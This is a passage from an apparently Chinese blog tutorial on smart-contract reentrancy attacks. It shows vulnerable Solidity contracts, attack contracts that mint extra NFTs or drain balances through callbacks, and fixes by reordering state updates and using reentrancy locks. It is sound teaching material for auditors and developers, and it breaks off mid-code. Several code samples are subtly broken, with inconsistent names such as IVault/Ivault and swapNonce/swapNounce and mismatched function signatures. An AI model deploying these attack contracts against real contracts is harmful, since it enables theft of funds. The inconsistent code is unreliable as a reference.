+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kt">bool</span> <span class="n">success</span> <span class="o">=</span> <span class="k">payable</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">).</span><span class="nb">send</span><span class="p">(</span><span class="nb">balance</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nb">require</span><span class="p">(</span><span class="n">success</span><span class="p">,</span> <span class="s">&#34;Failed Sending ETH!&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="1222合约转账eth时使用-call并做好重入保护">12.2.2.合约转账ETH时，使用 call()，并做好重入保护</h3>
+<h1 id="13nft重入攻击">13.NFT重入攻击</h1>
+<p>上面说的重入攻击是攻击者通过合约漏洞（例如<code>fallback</code>函数）循环调用合约，将合约中资产转走或铸造大量代币。而在<code>NFT</code>中，为了防止用户误把资产转入黑洞而加入了安全转账：如果转入地址为合约，则会调用该地址相应的检查函数 。比如<code>ERC721</code>中的<code>safeTransferFrom</code>，函数会调用目标地址的 <code>onERC721Received()</code> 函数，而黑客可以把恶意代码嵌入其中进行攻击</p>
+<h2 id="131攻击方式">13.1.攻击方式</h2>
+<p>如以下合约：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">NFTReentrancy</span> <span class="k">is</span> <span class="n">ERC721</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="k">public</span> <span class="n">totalSupply</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">mapping</span><span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">bool</span><span class="p">)</span> <span class="k">public</span> <span class="n">mintedAddress</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 构造函数，初始化NFT合集的名称、代号
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">constructor</span><span class="p">()</span> <span class="n">ERC721</span><span class="p">(</span><span class="s">&#34;Reentry NFT&#34;</span><span class="p">,</span> <span class="s">&#34;ReNFT&#34;</span><span class="p">){}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// 铸造函数，每个用户只能铸造1个NFT
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// 有重入漏洞
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">function</span> <span class="nf">mint</span><span class="p">()</span> <span class="k">payable</span> <span class="k">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// 检查是否mint过
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nb">require</span><span class="p">(</span><span class="n">mintedAddress</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">==</span> <span class="kc">false</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// 增加total supply
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">totalSupply</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// mint
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">_safeMint</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">totalSupply</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// 记录mint过的地址
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">mintedAddress</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>攻击合约</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Attack</span> <span class="k">is</span> <span class="n">IERC721Receiver</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">NFTReentrancy</span> <span class="k">public</span> <span class="n">nft</span><span class="p">;</span> <span class="c1">// 有漏洞的nft合约地址
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 初始化NFT合约地址
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">constructor</span><span class="p">(</span><span class="n">NFTReentrancy</span> <span class="n">_nftAddr</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">nft</span> <span class="o">=</span> <span class="n">_nftAddr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1">// 攻击函数，发起攻击
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">function</span> <span class="nf">attack</span><span class="p">()</span> <span class="k">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">nft</span><span class="p">.</span><span class="n">mint</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// ERC721的回调函数，会重复调用mint函数，铸造10个
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">function</span> <span class="nf">onERC721Received</span><span class="p">(</span><span class="kt">address</span><span class="p">,</span> <span class="kt">address</span><span class="p">,</span> <span class="kt">uint256</span><span class="p">,</span> <span class="kt">bytes</span> <span class="k">memory</span><span class="p">)</span> <span class="k">public</span> <span class="k">virtual</span> <span class="k">override</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bytes4</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">nft</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">            <span class="n">nft</span><span class="p">.</span><span class="n">mint</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">this</span><span class="p">.</span><span class="n">onERC721Received</span><span class="p">.</span><span class="nb">selector</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在<code>onERC721Received</code>中就会重复调用<code>mint</code>函数，能够获得额外的<code>NFT</code>，这就属于恶意代码</p>
+<h2 id="132预防方式">13.2.预防方式</h2>
+<h3 id="1321使用变量记录mint过的地址避免重复操作">13.2.1.使用变量记录mint过的地址，避免重复操作</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nf">mint</span><span class="p">()</span> <span class="k">payable</span> <span class="k">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="c1">// 检查是否mint过
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nb">require</span><span class="p">(</span><span class="n">mintedAddress</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">==</span> <span class="kc">false</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="c1">// 增加total supply
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="n">totalSupply</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="c1">// 记录mint过的地址
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="n">mintedAddress</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="c1">// mint
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="n">_safeMint</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">totalSupply</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="1322重入锁">13.2.2.重入锁</h3>
+<p>同样是使用变量来记录mint的状态，当mint完之后状态释放，参考<a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/ReentrancyGuard.sol" target="_blank" rel="noopener noreffer">ReentrancyGuard</a></p>
+<h1 id="14跨服重入攻击">14.跨服重入攻击</h1>
+<p>所谓跨服，指的是攻击者从某一函数入手，但是攻击对象却是其它函数、合约</p>
+<h2 id="141攻击方式">14.1.攻击方式</h2>
+<h3 id="1411跨函数重入攻击">14.1.1.跨函数重入攻击</h3>
+<p>有以下合约：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">VulnerableBank</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">mapping</span><span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">uint256</span><span class="p">)</span> <span class="k">public</span> <span class="n">balances</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="kt">uint256</span> <span class="k">private</span> <span class="n">_status</span><span class="p">;</span> <span class="c1">// 重入锁
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// 重入锁
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kd">modifier</span> <span class="nf">nonReentrant</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="c1">// 在第一次调用 nonReentrant 时，_status 将是 0
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>       <span class="nb">require</span><span class="p">(</span><span class="n">_status</span> <span class="o">==</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#34;ReentrancyGuard: reentrant call&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="c1">// 在此之后对 nonReentrant 的任何调用都将失败
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="n">_status</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">_</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="c1">// 调用结束，将 _status 恢复为0
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="n">_status</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nf">deposit</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#34;Deposit amount must ba greater than 0&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">balances</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">+=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nf">withdraw</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">_amount</span><span class="p">)</span> <span class="k">external</span> <span class="n">nonReentrant</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="nb">balance</span> <span class="o">=</span> <span class="n">balances</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="nb">balance</span> <span class="o">&gt;=</span> <span class="n">_amount</span><span class="p">,</span> <span class="s">&#34;Insufficient balance&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">,</span> <span class="p">)</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">.</span><span class="nb">call</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="n">_amount</span><span class="p">}(</span><span class="s">&#34;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="n">success</span><span class="p">,</span> <span class="s">&#34;Withdraw failed&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">balances</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">=</span> <span class="nb">balance</span> <span class="o">-</span> <span class="n">_amount</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nf">transfer</span><span class="p">(</span><span class="kt">address</span> <span class="n">_to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_amount</span><span class="p">)</span> <span class="k">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="nb">balance</span> <span class="o">=</span> <span class="n">balances</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="nb">balance</span> <span class="o">&gt;=</span> <span class="n">_amount</span><span class="p">,</span> <span class="s">&#34;Insufficient balance&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">balances</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">-=</span> <span class="n">_amount</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">balances</span><span class="p">[</span><span class="n">_to</span><span class="p">]</span> <span class="o">+=</span> <span class="n">_amount</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>该合约对<code>withdraw</code>加了修饰器<code>nonReentrant</code>，防止重复性的转账攻击</p>
+<p>但是攻击者却可以调用其它函数，达到攻击的目的，查看以下攻击合约：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;../IVault.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Attack2Contract</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="n">victim</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="n">owner</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">_victim</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_owner</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">victim</span> <span class="o">=</span> <span class="n">_victim</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">owner</span> <span class="o">=</span> <span class="n">_owner</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">deposit</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">IVault</span><span class="p">(</span><span class="n">victim</span><span class="p">).</span><span class="n">deposit</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">}(</span><span class="s">&#34;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">withdraw</span><span class="p">()</span> <span class="k">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Ivault</span><span class="p">(</span><span class="n">victim</span><span class="p">).</span><span class="n">withdraw</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="nb">balance</span> <span class="o">=</span> <span class="n">Ivault</span><span class="p">(</span><span class="n">victim</span><span class="p">).</span><span class="n">balances</span><span class="p">[</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)];</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Ivault</span><span class="p">(</span><span class="n">victim</span><span class="p">).</span><span class="nb">transfer</span><span class="p">(</span><span class="n">owner</span><span class="p">,</span> <span class="nb">balance</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>攻击者的攻击步骤：</p>
+<p>1.手动调用<code>withdraw</code>，触发<code>VulnerableBank</code>中的取款操作</p>
+<p>2.触发<code>Attack2Contract</code>的<code>receive</code>方法，里面的逻辑是查询当前合约的余额，然后<code>VulnerableBank</code>转账给<code>owner</code>对应余额</p>
+<p>3.这里面需要理解的是，<code>owner</code>可能是攻击者的一个小号，<code>VulnerableBank</code>中的<code>transfer</code>在对<code>require(balance &gt;= _amount, &quot;Insufficient balance&quot;)</code>判断时，因为此时攻击者合约调用还未完成，<code>balance</code>还未更新，所以<code>require(balance &gt;= _amount, &quot;Insufficient balance&quot;)</code>判断能通过</p>
+<p>4.于是攻击者就实现了两次<code>withdraw</code>调用，实现了<code>双花</code>功能</p>
+<h3 id="1412跨合约重入攻击">14.1.2.跨合约重入攻击</h3>
+<p>有以下两个合约：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">TwoStepSwapManager</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">struct</span> <span class="nc">Swap</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">user</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">amount</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span><span class="p">[]</span> <span class="n">swapPath</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">bool</span> <span class="n">unwrapnativeToken</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="n">swapNonce</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">mapping</span><span class="p">(</span><span class="kt">uint256</span> <span class="o">=&gt;</span> <span class="n">Swap</span><span class="p">)</span> <span class="n">pendingSwaps</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="k">private</span> <span class="n">_status</span><span class="p">;</span> <span class="c1">// 重入锁
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 重入锁
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">modifier</span> <span class="nf">nonReentrant</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="c1">// 在第一次调用 nonReentrant 时，_status 将是 0
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nb">require</span><span class="p">(</span><span class="n">_status</span> <span class="o">==</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#34;ReentrancyGuard: reentrant call&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="c1">// 在此之后对 nonReentrant 的任何调用都将失败
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">_status</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">_</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="c1">// 调用结束，将 _status 恢复为0
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">_status</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">     <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">createSwap</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">_amount</span><span class="p">,</span> <span class="kt">address</span><span class="p">[]</span> <span class="n">_swapPath</span><span class="p">,</span> <span class="kt">bool</span> <span class="n">_unwrapnativeToken</span><span class="p">)</span> <span class="k">external</span> <span class="n">nonReentrant</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">IERC20</span><span class="p">(</span><span class="n">swapPath</span><span class="p">[</span><span class="mi">0</span><span class="p">]).</span><span class="n">safeTransferFrom</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">_amount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pendingSwaps</span><span class="p">[</span><span class="o">++</span><span class="n">swapNounce</span><span class="p">]</span> <span class="o">=</span> <span class="n">Swap</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">            <span class="n">user</span><span class="o">:</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">amount</span><span class="o">:</span> <span class="n">_amount</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">swapPath</span><span class="o">:</span> <span class="n">_swapPath</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">unwrapNativeToken</span><span class="o">:</span> <span class="n">_unwrapNativeToken</span>
+</span></span><span class="line"><span class="cl">        <span class="p">});</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">cancelSwap</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">_id</span><span class="p">)</span> <span class="k">external</span> <span class="n">nonReentrant</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Swap</span> <span class="k">memory</span> <span class="n">swap</span> <span class="o">=</span> <span class="n">pendingSwaps</span><span class="p">[</span><span class="n">_id</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">swap</span><span class="p">.</span><span class="n">user</span> <span class="o">==</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">delete</span> <span class="n">pendingSwaps</span><span class="p">[</span><span class="n">_id</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
